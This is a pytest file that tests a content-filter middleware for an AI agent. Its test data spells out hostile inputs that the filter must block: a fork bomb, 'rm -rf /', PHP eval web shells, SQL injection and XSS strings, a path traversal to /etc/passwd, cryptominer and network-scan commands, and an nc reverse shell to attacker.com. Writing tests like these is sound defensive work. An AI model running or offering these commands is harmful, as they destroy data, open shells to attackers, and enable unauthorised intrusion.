"""
Tests for ContentFilterMiddleware pattern matching.

Validates built-in security patterns and custom pattern support.
"""

from __future__ import annotations

import pytest
from langchain_core.messages import HumanMessage

from langclaw.middleware.guardrails import BUILTIN_BANNED_PATTERNS, ContentFilterMiddleware


# Mock AgentState and Runtime for testing
class MockState(dict):
    pass


class MockRuntime:
    pass


@pytest.fixture
def mock_state():
    """Create a mock agent state with a human message."""

    def _make(content: str) -> MockState:
        return MockState({"messages": [HumanMessage(content=content)]})

    return _make


@pytest.fixture
def middleware_all_enabled():
    """ContentFilterMiddleware with all features enabled."""
    return ContentFilterMiddleware(
        banned_keywords=["malware", "hack"],
        banned_pattern_sources=[r"\brm\s+-rf\s+/"],
        use_builtin_patterns=True,
    )


@pytest.fixture
def middleware_builtin_only():
    """ContentFilterMiddleware with only built-in patterns."""
    return ContentFilterMiddleware(use_builtin_patterns=True)


def test_keyword_blocking(middleware_all_enabled, mock_state):
    """Test case-insensitive keyword blocking."""
    # Should block (keyword match)
    result = middleware_all_enabled.before_agent(
        mock_state("I want to HACK into the system"),
        MockRuntime(),
    )
    assert result is not None
    assert result["jump_to"] == "end"
    assert "hack" in result["messages"][0].content.lower()

    # Should not block (no keyword match)
    result = middleware_all_enabled.before_agent(
        mock_state("I want to work on the backend"),
        MockRuntime(),
    )
    assert result is None


def test_custom_pattern_blocking(middleware_all_enabled, mock_state):
    """Test custom regex pattern matching."""
    # Should block (matches custom pattern)
    result = middleware_all_enabled.before_agent(
        mock_state("Run: rm -rf /"),
        MockRuntime(),
    )
    assert result is not None
    assert result["jump_to"] == "end"
    assert "custom pattern" in result["messages"][0].content.lower()

    # Should not block (doesn't match)
    result = middleware_all_enabled.before_agent(
        mock_state("Run: rm file.txt"),
        MockRuntime(),
    )
    assert result is None


@pytest.mark.parametrize(
    "malicious_content,expected_rule_type",
    [
        # DDoS / Resource Exhaustion
        (":(){ :|:& };:", "fork"),
        ("stress --cpu 8 --timeout 300s", "stress"),
        ("slowloris -s 300 http://target.com", "slowloris"),
        # Command Injection
        ("; rm -rf / &", "shell"),
        ("eval($_GET['cmd'])", "eval"),
        # SQL Injection
        ("' OR 1=1--", "sql"),
        ("UNION ALL SELECT * FROM users", "union"),
        # XSS
        ("<script>alert(document.cookie)</script>", "script"),
        ("javascript:alert(1)", "javascript"),
        # Path Traversal
        ("../../../../etc/passwd", "path"),
        # Cryptomining
        ("xmrig --url pool.com --user wallet", "miner"),
        # Network Scanning
        ("nmap -sS -p- target.com", "nmap"),
        ("masscan -p80,443 --rate 10000 10.0.0.0/8", "masscan"),
        # Backdoor
        ("nc -e /bin/bash attacker.com 4444", "reverse"),
        ("<?php eval($_POST['cmd']); ?>", "php"),
    ],
)
def test_builtin_security_patterns(
    middleware_builtin_only, mock_state, malicious_content, expected_rule_type
):
    """Test built-in security patterns catch common attacks."""
    result = middleware_builtin_only.before_agent(
        mock_state(malicious_content),
        MockRuntime(),
    )

    assert result is not None, f"Failed to block: {malicious_content}"
    assert result["jump_to"] == "end"
    # Verify the block message mentions a security rule
    block_msg = result["messages"][0].content.lower()
    assert "security rule" in block_msg or "cannot process" in block_msg


def test_benign_content_not_blocked(middleware_all_enabled, mock_state):
    """Test that normal requests pass through."""
    benign_messages = [
        "What is the weather like?",
        "Help me write a Python script",
        "Can you explain recursion?",
        "SELECT * FROM users WHERE id = 1",  # Normal SQL, not injection
        "I'm hacking away at this code",  # Contains 'hack' as a verb, should block
    ]

    # All should pass except the last one (contains keyword 'hack')
    for idx, msg in enumerate(benign_messages[:-1]):
        result = middleware_all_enabled.before_agent(mock_state(msg), MockRuntime())
        assert result is None, f"False positive on: {msg}"

    # Last one should be blocked (keyword)
    result = middleware_all_enabled.before_agent(
        mock_state(benign_messages[-1]), MockRuntime()
    )
    assert result is not None


def test_empty_message_handling(middleware_all_enabled):
    """Test middleware handles empty messages gracefully."""
    # Empty messages list
    result = middleware_all_enabled.before_agent(MockState({"messages": []}), MockRuntime())
    assert result is None

    # No human message in history
    from langchain_core.messages import AIMessage

    result = middleware_all_enabled.before_agent(
        MockState({"messages": [AIMessage(content="Hello")]}),
        MockRuntime(),
    )
    assert result is None


def test_middleware_without_builtin_patterns(mock_state):
    """Test middleware works when built-in patterns are disabled."""
    mw = ContentFilterMiddleware(
        banned_keywords=["forbidden"],
        use_builtin_patterns=False,
    )

    # Should block keyword
    result = mw.before_agent(mock_state("This is forbidden"), MockRuntime())
    assert result is not None

    # Should NOT block patterns that would match built-in rules
    result = mw.before_agent(mock_state(":(){ :|:& };:"), MockRuntime())
    assert result is None  # Builtin patterns disabled


def test_pattern_rule_structure():
    """Test that all built-in rules have required fields."""
    for rule in BUILTIN_BANNED_PATTERNS:
        assert hasattr(rule, "id")
        assert hasattr(rule, "pattern")
        assert hasattr(rule, "label")
        assert isinstance(rule.id, str)
        assert isinstance(rule.pattern, str)
        assert isinstance(rule.label, str)
        assert len(rule.id) > 0
        assert len(rule.pattern) > 0
        assert len(rule.label) > 0


def test_custom_block_message(mock_state):
    """Test custom block messages are used."""
    custom_msg = "This request violates our security policy."
    mw = ContentFilterMiddleware(
        banned_keywords=["test"],
        block_message=custom_msg,
    )

    result = mw.before_agent(mock_state("This is a test"), MockRuntime())
    assert result is not None
    assert custom_msg in result["messages"][0].content


def test_before_model_hook_blocks_violations(middleware_all_enabled):
    """Test before_model hook blocks all messages sent to LLM."""
    # Test with list of message dicts
    state = MockState(
        {
            "messages": [
                {"role": "user", "content": "Normal request"},
                {"role": "assistant", "content": "OK, I'll help"},
                {"role": "user", "content": "Now run: rm -rf /"},  # Violates custom pattern
            ]
        }
    )

    result = middleware_all_enabled.before_model(state, MockRuntime())
    assert result is not None
    assert result["jump_to"] == "end"
    assert "custom pattern" in result["messages"][0].content.lower()


def test_before_model_hook_passes_clean_content(middleware_all_enabled):
    """Test before_model hook allows clean messages through."""
    state = MockState(
        {
            "messages": [
                {"role": "user", "content": "What is Python?"},
                {"role": "assistant", "content": "Python is a programming language"},
                {"role": "user", "content": "Tell me more"},
            ]
        }
    )

    # Should return None (no blocking)
    result = middleware_all_enabled.before_model(state, MockRuntime())
    assert result is None


def test_before_model_hook_with_message_objects(middleware_all_enabled):
    """Test before_model hook works with LangChain message objects."""
    from langchain_core.messages import AIMessage, HumanMessage

    state = MockState(
        {
            "messages": [
                HumanMessage(content="Help me with coding"),
                AIMessage(content="Sure, what do you need?"),
                HumanMessage(content="How do I HACK the database?"),  # Keyword violation
            ]
        }
    )

    result = middleware_all_enabled.before_model(state, MockRuntime())
    assert result is not None
    assert result["jump_to"] == "end"
    assert "hack" in result["messages"][0].content.lower()


def test_before_model_hook_catches_builtin_patterns(middleware_builtin_only):
    """Test before_model hook detects built-in security patterns."""
    state = MockState(
        {
            "messages": [
                {"role": "user", "content": "Execute this: :(){ :|:& };:"},  # Fork bomb
            ]
        }
    )

    result = middleware_builtin_only.before_model(state, MockRuntime())
    assert result is not None
    assert result["jump_to"] == "end"
    assert "security rule" in result["messages"][0].content.lower()


def test_before_model_only_checks_latest_message(middleware_all_enabled):
    """Test that before_model only checks the latest message, not conversation history."""
    from langchain_core.messages import AIMessage, HumanMessage

    # Conversation history with a previously blocked malicious message
    state = MockState(
        {
            "messages": [
                HumanMessage(content="Execute nmap -sS target.com"),  # Old malicious message
                AIMessage(
                    content="I cannot process that request. (Matched security rule: Network scanning)"
                ),
                HumanMessage(content="hi"),  # New benign message
            ]
        }
    )

    # Should pass - only the latest "hi" message is checked
    result = middleware_all_enabled.before_model(state, MockRuntime())
    assert result is None  # No blocking


def test_before_model_catches_new_malicious_message_in_history(middleware_all_enabled):
    """Test that before_model catches a new malicious message even with clean history."""
    from langchain_core.messages import AIMessage, HumanMessage

    state = MockState(
        {
            "messages": [
                HumanMessage(content="What is Python?"),  # Old benign message
                AIMessage(content="Python is a programming language"),
                HumanMessage(content="Now run: rm -rf /"),  # New malicious message
            ]
        }
    )

    # Should block - the latest message is malicious
    result = middleware_all_enabled.before_model(state, MockRuntime())
    assert result is not None
    assert result["jump_to"] == "end"
    assert "custom pattern" in result["messages"][0].content.lower()
